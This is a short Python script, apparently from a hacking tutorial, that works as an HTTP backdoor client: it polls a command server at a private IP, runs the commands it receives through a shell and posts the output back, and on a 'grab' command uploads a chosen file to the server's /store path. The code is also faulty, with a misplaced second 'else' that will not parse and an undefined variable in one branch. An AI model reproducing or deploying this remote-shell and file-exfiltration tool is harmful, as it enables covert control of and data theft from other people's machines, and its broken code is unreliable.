import requests
import os
import subprocess
import time

while True:

    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path): # check if the file is there
            url = "http://192.168.0.152:8080/store" # Appended /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself
            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())
        
        else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())
    time.sleep(3)

